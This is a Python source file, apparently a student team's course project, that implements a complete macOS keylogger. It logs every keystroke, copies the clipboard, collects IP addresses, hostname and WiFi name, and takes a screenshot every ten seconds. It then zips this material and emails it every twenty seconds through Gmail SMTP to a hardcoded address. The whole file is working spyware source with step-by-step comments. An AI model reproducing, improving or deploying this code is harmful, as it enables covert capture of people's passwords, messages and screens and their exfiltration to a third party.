# Programmers Names:    
# Mariam Alomari.         
# Sharifa Alsadah.        
# Hana Saleh.            
# Razan Alogaiel.         
# Reema Aljumaia.         

# Instructor: Hussain Alattas.
#------------------------------------


# pynput module contains keyboard and mouse classes.
from pynput import keyboard
# numpy module provides an array object of arbitrary homogeneous items.
import numpy as np
# cv2 module is designed to solve computer vision problems.
import cv2
# pyautogui module provides the ability to simulate mouse cursor moves and clicks as well as keyboard button presses.
import pyautogui
# platform module provides functions that access information of the underlying platform (operating system).
import platform
# requests module allows you to send HTTP requests using Python.
from requests import get
# subprocess module used to run new codes and applications by creating new processes.
import subprocess
# smtplib module defines an SMTP client session object that can be used to send mail.
import smtplib
# email module is a library used for managing email messages.
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

import os
import shutil
import threading
import socket
from datetime import date
import time

today = date.today()

# getClipboardData() is a function that retrieves last copied data by the user.
def getClipboardData():
    # We created a subprocess, then utilized Popen to let the child process communicate with its parent via pipes.
    p = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
    # wait for child process to terminate.
    p.wait()
    # read the clipboard data and store it in a variable.
    data = p.stdout.read()
    data = str(data)
    # open a new file and write the stored data in append mode.
    with open("clipboardInfo.txt", "a") as f:
        f.write(data[1:] + "\n")

# computer_information() is a function that retrieves the user's system information.
def computer_information():
    # open a new file in write mode to store the acquired information.
    with open("computerInfo.txt", "w+") as f:
        # get the user's private ip address.
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            # get the user's public ip address.
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + " \n")

        except Exception:
            f.write("Couldn't get Public IP Address")

        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

        return hostname

# get_wifi_info() is a function that retrieves the user's system information.
def get_wifi_info():
    # We created a subprocess, then utilized Popen to direct the child process to the location that contains WiFi information.
    process = subprocess.Popen(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport','-I'], stdout=subprocess.PIPE)
    # read data from stdout and stderr, until end - of - file is reached.
    out, err = process.communicate()
    # wait for process to terminate.
    process.wait()

    #  create a dictionary to store retrieved data from the specified path.
    wifi_info = {}
    # decode the content of out file then save them as key and value in wifi-info dictionary.
    for line in out.decode("utf-8").split("\n"):
        if ": " in line:
            key, val = line.split(": ")
            key = key.replace(" ", "")
            val = val.strip()

            wifi_info[key] = val
            # name variable will contain the current wifi name used by the user which can be extracted by getting the value of the key SSID.
            name = wifi_info.get('SSID',)

    # append the WiFi name to computerInfo.txt file that was created by computer_information() function.
    with open("computerInfo.txt", "a") as f:
        f.write("WiFi Name: " + str(name))

#For log delivery we created send_email() function that takes hostname as an argument and sends the log files through email remotely .
def send_email(hostname):
    email_user = 'admin@admin.com'
    email_password = 'password123'
    email_send = 'admin@admin.com'
    subject = 'Key logger'

    # The program will keep sending emails every 20 seconds.
    while(True):
        time.sleep(20)

        # MIMEMultipart creates the container (msg) email message. It is used since we will have attachments in the email.
        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject

        # The body of the email will include the hostname that was returned from computer_information() function.
        body = 'This is the keylogger of: ' + hostname
        # attach the body to the container and set the font type to plain.
        msg.attach(MIMEText(body, 'plain'))

        # Since the email will be sent regularly, we need to override the zipped file to avoid "file exists" errors, first check if screenshot.zip exists, and if so remove it.
        if os.path.exists('./screenshot.zip'):
            os.remove('./screenshot.zip')

        # create a zipped file of the existing folder called ./ScreenShots.
        shutil.make_archive('screenshot', 'zip', './ScreenShots')

        # files list contains all the attachments.
        files = ["./keyfile.log", './computerInfo.txt', './clipboardInfo.txt','./screenshot.zip']

        # iterate through the file in the list.
        for i in files:
            # open each file in read-binary mode and store them in a variable.
            attachment = open(i, 'rb')
            # add file as application/octet-stream and download it as attachment.
            part = MIMEBase('application', 'octet-stream')
            part.set_payload((attachment).read())
            # encode file in ASCII characters to send by email.
            encoders.encode_base64(part)
            # add payload header with filename
            part.add_header('Content-Disposition', "attachment; filename= " + i[2:])

            # attach the file to the container.
            msg.attach(part)

        # saves the container content in a variable as a string.
        text = msg.as_string()
        # create SMTP session for sending the mail.
        server = smtplib.SMTP('smtp.gmail.com', 587)
        # enable security.
        server.starttls()
        # login with email_user and password.
        server.login(email_user, email_password)
        # Send mail with from_addr, to_addrs, msg.
        server.sendmail(email_user, email_send, text)
        # close the session.
        server.quit()

# screenshot() is a function that takes screenshots regularly of the user's screen.
def screenshot():
    # specify the directory name.
    directory = "ScreenShots"
    # specify the directory path.
    dir_path = "/Users/username/PycharmProjects/keylogger"
    path = os.path.join(dir_path, directory)

    # if the directory does not exist, then create it.
    if not os.path.exists(path):
        os.mkdir(path)
    # if the directory exists, override it by first removing all the subdirectories and then create it.
    else:
        shutil.rmtree(path)
        os.makedirs(path)

    i = 1
    # infinite loop to keep taking screenshots every 10 seconds.
    while(True):
        # take screenshot using pyautogui
        image = pyautogui.screenshot()
        # since the pyautogui takes as a PIL(pillow) and in RGB we need to convert it to numpy array and BGR so we can write it to the disk
        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
        # writing it to the disk using openCV
        cv2.imwrite(path + "/image" +str(i) + ".png", image)
        # increment the counter, which is used to represent the name of the image (e.g image1.png).
        i=i+1
        time.sleep(10)

# keypressed() is a function that the key pressed by the user as an argument, and record keystrokes.
def keypressed(key):
    # print each pressed key on the run window.
    print(str(key))

    # open the log file in append mode, to write the pressed keys.
    with open("keyfile.log", 'a') as logkey:
        # try-except block to handle errors related to converting the keys to characters.
        try:
            # To organize the log file:

            # if the user presses a space, then a space will be written into the file.
            if str(key) == "Key.space":
                logkey.write(" ")
            # if the user presses the enter key, then a newline will be written into the file along with the current date.
            elif str(key) == "Key.enter":
                logkey.write("\n")
                logkey.write(str(today) + ": ")
            # if the user presses the backspace key, then the string {BackSpace} will be written into the file.
            elif str(key) == "Key.backspace":
                logkey.write(" {BackSpace} ")
            else:
                # convert the pressed key to character, and write it into the file.
                ch = key.char
                logkey.write(ch)

        except Exception as ex:
            print("error getting char", ex)

if __name__ == "__main__":

    # functions calls.
    hostname = computer_information()
    get_wifi_info()
    getClipboardData()

    # create a thread that executes send_email() function.
    t1 = threading.Thread(target= send_email, args= [hostname])
    t1.start()

    # create a thread that executes screenshot() function.
    t2 = threading.Thread(target=screenshot)
    t2.start()

    # open the log file in append mode, and write the current date whenever the program starts.
    with open("keyfile.log", 'a') as logkey:
        logkey.write("\n" + str(today) + ": ")
    # create a listener object that will listen to the pressed key by the user and pass them to keypressed() function.
    listener = keyboard.Listener(on_press= keypressed)
    listener.start()

    # in order to record every key event done by the user, we utilized input() inside try and except block.
    try:
        input()
    except KeyboardInterrupt:
        pass

